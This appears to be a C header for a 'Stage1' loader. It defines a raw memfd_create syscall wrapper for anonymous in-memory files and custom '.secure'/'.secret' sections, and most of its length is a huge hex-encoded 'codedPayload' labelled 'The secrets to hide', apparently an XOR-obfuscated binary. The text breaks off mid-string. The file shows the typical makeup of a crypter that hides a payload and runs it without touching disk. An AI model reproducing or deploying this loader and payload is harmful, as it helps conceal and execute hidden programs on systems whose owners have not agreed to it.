
#include "stdafx.h"

#ifndef Stage1_H
#define Stage1_H

#define MEMFD_CREATE 319
inline int anonFile(const char *name, unsigned int flags) {
    return syscall(MEMFD_CREATE, name, flags);
}

#define CRYPTED __attribute__((section(".secure")))
#define SECRET __attribute__((section(".secret")))

// The secrets to hide.
SECRET unsigned char codedPayload[] = "e2b5c5b06f626f75616b6370796a6d6171759f6b6470796a0d716e75616b6370b96a6d616e75616b33a7796a6d616e75616b6370b96aa5617b75a16b8270976a73616e75656b6370b96a6d616e75616ba370796a6d616e75a16b6370796a6d614677616b6370796a45636e75616b6370816a6d616e75616b6670796a71616e75796e6370796a6d618678616b6370796a85646e75616b6370956a6d616e75616b7f70796a6d616e75626b6370796a6d616f75616b6770796a6d616e75616b6370796a6d616e75616b6370796a6d616e75b1726370796a6d61be7c616b6370796a6d716e75616b63707a6a6d617375616b6380796a6d616e75617b6370796a6d616e85616b6370796a9e636e75616b6370aa6c6d616e75616b6380796a6d616e75626b63707d6a6d616e95616b6370796a6d816e75616b6370798a6d616e75616bc771796a6d616e75c56c6370796a6d616e85616b6370796a6e616e75676b637001976d616e75616bebad796a6d616e75e9a86370796a6d61f677616b6370796afd636e75616b6370797a6d616e75616b6570796a73616e7501986370796a6d610eb2616b6370796a0d9e6e75616b6370796c6d616e75616b6372796a6d616e75696b6370796a6d617275616b6770796aa5646e75616b6370b16d6d616e75616b9b73796a6d616e75916b6370796a6d619e75616b6370796a75616e75616b63707d6a6d617275616bcb73796a6d616e75c96e6370796a6d61d678616b6370796ab1616e75616b6370bd6a6d616e75616b6770796a6d616e75b450d7d47d6a6d61a678616b6370796aa5646e75616b6370b16d6d616e75616b9370796a6d616e75916b6370796a6d617675616b6370796abd46e2d9656b6370ad8a6d616e75616b9790796a6d616e75958b6370796a6d61b275616b6370796ab1616e75616b63707d6a6d616e75616bb455edce73616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75716b6370796a6d61c05ad5cf6770796af58e6e75616b637001a76d616e75616bebad796a6d616e75d96d6370796a6d61e677616b6370796a6e616e75616b6370a8d6d6c3a4a990d7c79de5d3dbd6e6a2d9a3999daf9e9bd4dda3936b6370796a71616e75816b63707e6a6d61b5c3b66b6570792a71616e75646b6370796a6d6170f5612b6770796a6e616e75616b63707d6a6d618275616b6670796ab4afc375a4fa2f29c7890d5b50e6d61805d1f945a1b74cbe656b6370896a6d616f75616baabece6a6d616e75646b63707b6a6d616e75616b6370796a6f616e756a6b63707a6a6d617475616b6370fa6a6d616e756a6b6370796a6d613fda2fd86370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75e96b63708b6a6d616e75616b6370796a6d616e75616b6370f46a6d618075616b6370796a6d616e75616b6370796a6d61cc75616b7570796a6d616e75616b6370796a6d616e75616bd970796a7f616e75616b6370796a6d616e75616b6370796a7d616e75816b6370796a6d616e75616b6370796a6d616e75626b6370996a6d616e75616b6370796a6d616e75616b6370a56a6d618e75616b6370796a6d616e75616b6370796a6d61b475616b7570796a6d616e75616b6370796a6d616e75616bfd70796a8f616e75616b6370796a6d616e75616b6370796a6dc0cddccedad1cfecdeced3e2d4c06bc2b9cdb7ccc5d3e7c6d2cce3edcfdfb5bbb8cddad1d5cdcbcfcdd375c0b4b7bdd8dcd2c8d7e8d5d0d5c4c6add9d0dcdab5ccc5dcde6accbbbcc8d5a3ccdfecc9cfc2e1da95b4d1d9edae9ea6e475c0c5b1c3eda2d6d0e1d4c3ccd6d5adb3dbcae2b892b0d970e9dfe1d46ed4c0cedbd1d8cbe1c6e6ded56bc2cfe5d3cfc4cde8d5ccd5e4d8d7cecadc75c0cac6e8dac9d3cadcd6cdd4ddd579d6d6c3e1e9c5ce8e9ba7dddc8fa475cdd4c5d3a7dddc8fa475a8b7acb2bcc2c5c0a1a3956baabcc2acb0c0a0a3949f63b7c5b3afa4cda78f9d91a5796a6d617175636b67707b6a6e616f75626b67707b6a6d616e75616b64707a6a16616e75716b6370996a6d61e29ef37363707d6a2f616e75616b63707a6a6f612675616b7370796a6d616e7515fcf976796a70613c75616b7370796ae27bd77e616b6570526a6d616e75616bebad796a6d616e75696b6370796a6d61ee86616b6370796afd9e6e75616b6370816a6d616e75616b6b82796a6d616e75f9a86370796a6d617675616b6370796aad726e75616b637081aa6d616e75616b6b70796a6d616e7569ab6370796a6d613eb4616b6370796a73616e756a6b6370796a6d616e75616b3baf796a6d616e75676b63707a6a6d616e75616b6370796a4da06e75616b63707f6a6d617375616b6370796a6d616e7549aa6370796a6d617475616b6970796a6d616e75616b637069a96d616e75616b6970796a74616e75616b6370796a6d6166b4616b6370796a73616e75696b6370796a6d616e75616b1baf796a6d616e75686b63707b6a6d616e75616b6370796a2da06e75616b6370806a6d617175616b6370796a6d616e7529aa6370796a6d617575616b6770796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d6161847f65abf36572b5ec734e906b63b8fe2ae1636d45a9ee27783c6a6d616e7560a0e59f796a6c86f2a4616b728fb96a60708c6fc96b637079534f606d74c7fb567f9764d5626e756154356f7869d3f161847f65cb72796a6d4a3074606ac9006c798b5b6d9ac79a6370df798ca56e75547a816a788fab906e75c77a82b4796a60708c6f6090999f796ad3708db9616b567f97646c869ca4616bc97f98ae6d6161847f65945dc2f33ebfb6fe43b3e65469bac1a69f359234abfdb6346d616e74767e9270795ed38f7d94e56b6370796ab5eeabae906b63b8066f9f906e75a9a45be48eb2f86664a3616babf539de76604e8480eb6370796a30708df5616b6370c1f7aa6a9d7561b3f0a57b996d61b69e5fb3ec60c12b5ba0b636596eab713fb23e5fe289a9f66835a76a6da9f335d5736250df798ca56e75247a82f0796a6d6161847f65e3ad3e986d616eea8cc0abf3b6e49b616e75a9f448e485b2f89e14a3616b4b6977696c49d274606a297516986d616fd2247a82703c798ce16e75616b567f976456d86d74605e728e73bfb5ea53bde45773f9f666b5eae365a9f868d5876a6da9f73c4950616f78226d616e752a2e567f9764c2a9f75aa9ee4f8002e769eae36de4e85f71eea5eede6674606b63e5abb2fa66a5a3616babf940520b5f6d74a9f8688fa76a6da9f737a9f8688ea76a6da9f73ba9f6686ba66a6da9f73c49d6616f78fa362461847f65b8b8024f2b606d75612a6470796a55f46d7460c82670796a60708c6fa9ee4f78c1ed31693175616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b63707a6a6f616e75616b6d8bd4a39eceb4eac4d683e9decbd58d8ec1d6ceccd6dedc8daa95e281b0d9d9e58b8d9ccb90bc9e9cdd796a6e7c71b0a16b6370806a6d615a64606ad770796a99516d74fd6b6370b55a6c602275616bcf607869c9616e75b65c626f456a6d61ec66606a4f70796a41526d746d6c63708d6a6d616e75616b64eacb6a6ed97e767c776a78096b6d618275616b7f70796a75516d74876b637079ae74716e75616b8770796aa1616e75d15a626fb96a6d616e8371b17188c37978d876f561aa7da9a39d91836e75616b7770796ac9616e75e95a626f896a6d616e75616b6370796a81616e75d56b6370f9596c609e75616b6370796a6d616e757d6b6370056a6d61ef65606a8c70796a6da67c85e76da67d7fca79687675616b7f70796a19616e75eb5b626fcf6a6d616eba6f7be972bc777363bb8168736370956a6d613a75616b2360786986616e7561b07180ff6cb06e74c56d726b70796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d61ee86616b6370796a75736e75616b6370b97b6d616e75616b6470796a6d616e750a6b6370796a6d616f75616b6370796a25616e75616b6370856a6d616e75616b6380796a6d616e756e6b6370796a6d619287616b6370796a86616e75616b637001a76d616e75616b7e70796a6d616e75716b6370796a6d618875616b6370796a059e6e75616b6370956a6d616e75616b6b70796a6d616e75566962df796a6d611e78616b6370796a72616e75616b6370416e6d616e75616b6970796a6d616e75396e6370796a6d617875616b6370796a52616e75616b6370846a6d616e75616b7b70796a6d616e75766b6370796a6d616e75616b6370796a70616e75616b637019a96d616e75616b6570796a6d616e75a96b6370796a6d618275616b6370796a74616e75616b6370906a6d616e75616b6b77796a6d616e75686b6370796a6d61867b616b6370796a75616e75616b6370696a6d616e75616b6c70796a6d616e75796b6370796a6d618c75616b6370796a75616e75616b637074696cd06e75616b647079726d616e755f6a62df796a6d61367a616b6370796a6c606de4616b63707b6a6d616e75616b536f78d96d616e750f706370796a6d61677460da6370796a71616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b637019a76d616e75616b6370796a6d616e75616b6370796a6d619e85616b6370796aad716e75616b6370c97a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75616b6370796a6d6176b5616b6370796ab4a4b1af8193b8d2eed8e1d68ea69399959ea9979e98e3d7d6d9d7e5aa938d92a0a393999370796a6d616e75616b6370796a6d616e75616b6370796a6d616e75626b63707d6a5e606e75616b6370796a6d616e75616b6370826a6d616f75656bef73796a6d616e75816b6370796a6d618175616b67706a696d616e75616b6370796a6d616e75616b8170796a6f617e75317b6370796a6d616e75616b6370796a8d616e75636b7370797b6d616e75616b6370796a6d616e75946b63707b6a7d61ae86616b6370796a6d616e75616b6370c26a6d616f757b6b73b0796a6d616e75626b6370796a6d61c375616b64708f6a059e6e75616b6370796a6d616e75616bdf70796a6f617e75e17c6370796a6d616e75616b6370796af5616e75626b787001a76d616e75616b6370796a6d616e75086b63707d6a5e606e75616b6370796a6d616e75616b63702b6a6d616f757b6b74b0796a6d616e75626b6370796a6d612f75616b6570896a1f726e75616b6370cf6a6d616e75616b5470796a6f617e75697d6370796a6d618775616b6370796a80616e75656b546f796a6d616e75616b6370796a6d616e75666c63707a6a8161ce96616b6370796a6d616e75616b6370796a6d617275526a6370796a6d616e75616b6370796a6d618176616b63708c6aa1816e75616b6370796a6d616e75616b8971796a6e61857501a86370796a6d616e75616b6370796a9c626e75626b7b7019a96d616e75616b6370796a6d616e75a66c6370896a86617eb5616b6370796a6d616e75616b63704c6b6d618e757a6b63b0796a6d616e75616b6370796a6d61ba76616b74708b6a6d816e75616b63707d6a6d616e75616bbe71796a8f616e75616b6370796a6d616e75616b6370796a6d626e75736b7370027b6d616e75616b8c70796a6d616e75d76c63708a6c866176b5616b6370796a6d616e75616b6370fc6b6d618077726b8782796a6d616e75616b6370796a6d61f776616b7570796a6d616e75616b6370796a6d616e75616b0971796a7f616e75616b6370796a6d616e75616b6370796a44626e75736b7370197a6d616e75616b8970796a6d616e75206c63708b6c79616e85616b6370796a6d616e75616b63703e6b6d617f777a6b73b0796a6d616e75616b6370796a6d613f76616b7370926a6da16e75616b6370796a6d